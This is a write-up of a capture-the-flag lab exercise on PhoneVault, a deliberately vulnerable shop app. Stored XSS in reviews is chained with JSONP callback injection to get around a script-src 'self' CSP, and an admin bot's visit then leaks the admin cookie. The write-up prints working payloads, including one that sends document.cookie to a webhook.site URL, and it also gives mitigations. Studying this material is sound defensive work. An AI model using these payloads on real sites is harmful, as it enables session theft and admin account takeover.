---
title: "Stored XSS and JSONP Callback Injection Leads to Admin Session Theft | PhoneVault"
date: 2026-06-19 14:00:00 +0530
categories: [A05 - Injection, Cross-Site Scripting]
tags: [xss, stored-xss, jsonp, csp-bypass, cookie-theft, admin-bot, webverselabs-pro, phonevault]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/phonevault-stored-xss-jsonp-csp-bypass.webp
  alt: PhoneVault Stored XSS JSONP CSP Bypass
---

## Lab Link

[WebVerse Pro — PhoneVault](https://dashboard.webverselabs-pro.com/labs/phonevault)

---

## Overview

PhoneVault is a small e-commerce application for phones and accessories. The application has a product search feature, product reviews, and a report-to-admin workflow.

The vulnerability chain was built from two issues:

1. Product reviews were stored and rendered as raw HTML.
2. The `/api/products` endpoint exposed a JSONP `callback` parameter that reflected attacker-controlled JavaScript verbatim.

The site used a Content Security Policy with `script-src 'self'`, which blocked normal inline script execution. However, because the JSONP endpoint was same-origin JavaScript, it could be loaded through a `<script src=...>` tag from a stored review and used to execute attacker-controlled JavaScript in the admin bot's browser.

This allowed stealing the admin `pvtoken` cookie and accessing the admin panel.

## Objective

The goal was to exploit the application and access the admin-only secret.

## Vulnerability Identification

During testing, the product search API was found to support JSONP:

```http
GET /api/products?q=google&callback=pvSearch_5 HTTP/1.1
Host: phonevault.local
Cookie: pvtoken=<customer-token>
```

The response was JavaScript:

```http
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; report-uri /csp-report
```

```javascript
pvSearch_5({"products":[{"id":3,"name":"Google Pixel 9 Pro","slug":"pixel-9-pro","price":899,"category":"Smartphones"}]});
```

The `callback` value was reflected without validation:

```http
GET /api/products?q=google&callback=<script>alert(xss)</script> HTTP/1.1
Host: phonevault.local
Cookie: pvtoken=<customer-token>
```

Response:

```javascript
<script>alert(xss)</script>({"products":[{"id":3,"name":"Google Pixel 9 Pro","slug":"pixel-9-pro","price":899,"category":"Smartphones"}]});
```

This confirmed a JSONP callback injection sink.

## Developer Notes Disclosure

The application also exposed `/notes.txt`, which confirmed several important implementation weaknesses:

```text
PhoneVault — Developer Notes
============================
Last updated: 2025-04-15 — Jordan

TODO before production:
-----------------------
[ ] API: The /api/products endpoint supports a JSONP callback parameter for the
    header search widget. You can see it firing in the browser Network tab when
    you use the search box — look for requests to /api/products?q=...&callback=...
    Need to add input validation on the callback param before launch — currently
    reflects it verbatim. Low priority for now since the CSP should prevent abuse.

[ ] Reviews: content is rendered raw (HTML) to support bold/italic formatting.
    Sanitise with DOMPurify before launch. Deprioritised since users must be
    logged in to post.

[ ] Passwords: still plaintext. Switch to bcrypt before go-live.

[ ] Admin cookie: confirm with security team whether the flag cookie needs
    httpOnly. Left it off for now so the admin dashboard JS can read it.

[ ] Move session secret to env var.
```

These notes confirmed the intended chain:

- JSONP callback reflection
- Raw HTML review rendering
- Admin cookie readable by JavaScript
- Admin bot review workflow

## Recon and Approach

The report page showed that an admin bot would visit product pages submitted by users:

```http
POST /report HTTP/1.1
Host: phonevault.local
Content-Type: application/x-www-form-urlencoded
Cookie: pvtoken=<customer-token>

url=%2Fproduct%2F3
```

The server accepted only product URLs:

```html
<input
  type="text"
  name="url"
  class="form-control"
  placeholder="/product/1"
  pattern="^/product/.*"
  required>
```

This meant the exploit needed to be stored on a product page, then triggered by reporting that product page to the admin.

## Exploitation

### Step 1: Confirm Review Injection

A test review was submitted with script content:

```http
POST /product/3/review HTTP/1.1
Host: phonevault.local
Content-Type: application/x-www-form-urlencoded
Cookie: pvtoken=<customer-token>

rating=5&content=%3Cscript%3Ealert%28xss%29%3C%2Fscript%3E
```

The server stored the review and redirected back to the product page:

```http
HTTP/1.1 302 Found
Location: /product/3
```

However, the site's CSP prevented direct inline script execution.

### Step 2: Bypass CSP Using Same-Origin JSONP

The CSP allowed scripts from `'self'`:

```text
script-src 'self'
```

So instead of using inline JavaScript directly, the review could load the vulnerable same-origin JSONP endpoint:

```html
<script src="/api/products?q=google&callback=alert(document.domain)//"></script>
```

The JSONP endpoint would return executable same-origin JavaScript:

```javascript
alert(document.domain)//({"products":[...]});
```

The `//` comment prevents the trailing JSONP function call from breaking the payload.

### Step 3: Steal the Admin Cookie

Since the admin cookie was intentionally not marked `HttpOnly`, JavaScript could read `document.cookie`.

The final stored payload used an image request to exfiltrate the cookie to a webhook:

```html
<script src="/api/products?q=google&callback=new Image().src='https://webhook.site/<redacted>/?d='%2Bdocument.cookie//"></script>
```

URL-encoded inside the review submission:

```http
POST /product/5/review HTTP/1.1
Host: phonevault.local
Content-Type: application/x-www-form-urlencoded
Cookie: pvtoken=<customer-token>

rating=5&content=%3Cscript+src%3D%22%2Fapi%2Fproducts%3Fq%3Dgoogle%26callback%3Dnew+Image%28%29.src%3D%27https%3A%2F%2Fwebhook.site%2F%3Credacted%3E%2F%3Fd%3D%27%252Bdocument.cookie%2F%2F%22%3E%0D%0A%3C%2Fscript%3E
```

### Step 4: Trigger the Admin Bot

After storing the malicious review on product 5, the product page was reported:

```http
POST /report HTTP/1.1
Host: phonevault.local
Content-Type: application/x-www-form-urlencoded
Cookie: pvtoken=<customer-token>

url=%2Fproduct%2F5
```

The application confirmed the report:

```html
<div class="alert alert-success">
  ✓ Report submitted. An admin will review the page shortly.
</div>
```

When the admin bot visited `/product/5`, the stored review loaded the JSONP endpoint as a same-origin script, executed the callback payload, and sent the admin cookie to the webhook.

### Step 5: Access the Admin Panel

After receiving the admin `pvtoken`, the cookie was replaced in the browser/Burp request:

```http
GET /admin HTTP/1.1
Host: phonevault.local
Cookie: pvtoken=<admin-token>
```

The request succeeded:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

The page showed the admin user context:

```html
<span class="user-greeting">Hello, <strong>admin</strong></span>
<a href="/admin" class="btn btn-sm">Admin</a>
```

## Proof / Flag

The admin panel contained the final secret:

```html
<div class="flag-box">
  <div class="flag-box-label">🔐 Admin Secret</div>
  <code class="flag-value">WEBVERSE{REDACTED}</code>
</div>
```

The flag is intentionally redacted.

## Root Cause

The vulnerability existed because multiple insecure assumptions were combined:

1. The JSONP `callback` parameter was reflected directly into a JavaScript response.
2. User-submitted review content was rendered as raw HTML.
3. CSP relied on `script-src 'self'`, but trusted a same-origin endpoint that could be attacker-controlled.
4. The admin cookie was readable by JavaScript because it lacked the `HttpOnly` attribute.
5. The admin bot visited attacker-controlled product content through the report workflow.

## Impact

An authenticated low-privilege user could:

- Store malicious HTML in a product review.
- Bypass CSP using the same-origin JSONP endpoint.
- Execute JavaScript in the admin bot's browser.
- Read and exfiltrate the admin session cookie.
- Impersonate the admin user.
- Access `/admin` and retrieve the admin-only secret.

This is a full account takeover of the admin user in the context of the lab.

## Mitigation

Recommended fixes:

- Remove JSONP support if it is not strictly required.
- If JSONP is required, strictly validate callback names using a safe pattern such as:

```regex
^[a-zA-Z_$][a-zA-Z0-9_$\.]*$
```

- Return JSON with `application/json` instead of executable JavaScript where possible.
- Sanitize user-generated review content with a proven HTML sanitizer such as DOMPurify.
- Avoid rendering raw user-controlled HTML.
- Set session cookies with:

```text
HttpOnly; Secure; SameSite=Lax
```

- Do not allow admin bots to visit untrusted user content with privileged sessions.
- Use a stricter CSP with nonces or hashes instead of relying only on `script-src 'self'`.
- Remove sensitive developer notes from production.

## Lessons Learned

This lab is a good example of why CSP should not be treated as a complete XSS defense.

Even though inline scripts were blocked, the application still exposed a same-origin JavaScript endpoint where attacker-controlled input became executable code. Because the browser trusted same-origin scripts, the JSONP endpoint became a CSP bypass primitive.

The final exploit worked because stored XSS, JSONP callback injection, an admin review bot, and a non-HttpOnly admin cookie were chained together.

## Final Chain

```text
Raw review HTML
    ↓
Stored script tag on /product/5
    ↓
Same-origin JSONP callback injection at /api/products
    ↓
CSP bypass with script-src 'self'
    ↓
Admin bot visits reported product page
    ↓
JavaScript reads document.cookie
    ↓
Admin pvtoken exfiltrated to webhook
    ↓
Cookie swap
    ↓
/admin access
    ↓
Admin secret recovered
```
